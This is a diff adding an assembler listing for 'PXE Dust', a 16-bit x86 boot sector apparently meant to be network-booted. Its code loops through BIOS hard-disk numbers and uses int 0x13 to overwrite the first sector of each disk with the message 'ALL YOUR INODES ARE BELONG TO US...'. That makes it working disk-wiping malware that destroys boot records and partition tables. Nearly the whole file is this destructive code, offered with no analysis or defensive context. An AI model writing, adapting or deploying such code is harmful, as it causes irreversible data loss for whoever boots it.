@@ -1,0 +1,75 @@
+     1                                  
+     2                                  ; ---------------------------------------------------
+     3                                  ; PXE Dust                (c)2022 Christopher Woodall
+     4                                  ; ---------------------------------------------------
+     5                                  ;
+     6                                  ; ---------------------------------------------------
+     7                                  
+     8                                  ; Compiller Info
+     9                                  [BITS 16]     ; 16 Bit Real Mode
+    10                                  [ORG 0x7C00]  ; BIOS Entry Point (where the code is loaded)
+    11                                  
+    12                                  
+    13                                  ; ---------------------------------------------------
+    14                                  ;
+    15 00000000 EB01                    jmp main
+    16 00000002 90                      nop
+    17                                  
+    18                                  
+    19                                  ; ---------------------------------------------------
+    20                                  ; FAT12 File System (1.44MB)
+    21                                  
+    22                                  
+    23                                  ; ---------------------------------------------------
+    24                                  main:
+    25                                    ;; Stack Setup
+    26 00000003 31C0                    	xor ax, ax	 ; Clear AX
+    27 00000005 8ED8                    	mov ds, ax   ; Set DS to 0
+    28 00000007 8EC0                    	mov es, ax   ; Set ES to 0
+    29 00000009 89C4                    	mov sp, ax	 ; Set Stack Pointer to 0
+    30 0000000B 8ED0                    	mov ss, ax   ; Set Stack Segment to 0
+    31 0000000D 89E5                    	mov bp, sp   ; Set Base Pointer to 0
+    32                                  	; mov sp, 0xFFFF
+    33                                  
+    34 0000000F E80200                  	call loop_disks
+    35                                  
+    36 00000012 EBFE                    	jmp	$
+    37                                  
+    38                                  
+    39                                  ; ---------------------------------------------------
+    40                                  loop_disks:
+    41                                    .loop:
+    42 00000014 E80E00                      call write_disk
+    43 00000017 720B                        jc .done
+    44 00000019 A1[3900]                		mov ax, [bootdev]
+    45 0000001C 83C001                      add ax, 0x01
+    46 0000001F A3[3900]                    mov [bootdev], ax
+    47 00000022 EBF0                        jmp .loop
+    48                                    .done:
+    49 00000024 C3                          ret
+    50                                  
+    51                                  
+    52                                  ; ---------------------------------------------------
+    53                                  write_disk:
+    54 00000025 B403                        mov ah, 0x03
+    55 00000027 BB[3A00]                    mov bx, DUST
+    56 0000002A B001                        mov	al, 1	; Write one sector
+    57 0000002C B500                        mov	ch, 0	; First track
+    58 0000002E B101                        mov	cl, 1	; First sector
+    59 00000030 B600                        mov	dh, 0	; First head - assume only one
+    60 00000032 8A16[3900]                  mov dl, [bootdev]
+    61 00000036 CD13                        int 0x13
+    62                                  
+    63 00000038 C3                      		ret
+    64                                  
+    65                                  
+    66 00000039 80                      bootdev db 0x80	; Boot device number
+    67                                  
+    68 0000003A 414C4C20594F555220-     DUST  db  "ALL YOUR INODES ARE BELONG TO US...",0xD,0xA,0
+    68 00000043 494E4F444553204152-
+    68 0000004C 452042454C4F4E4720-
+    68 00000055 544F2055532E2E2E0D-
+    68 0000005E 0A00               
+    69                                  
+    70 00000060 00<rept>                times	510-($-$$)	db	0
+    71 000001FE 55AA                    dw	0xAA55
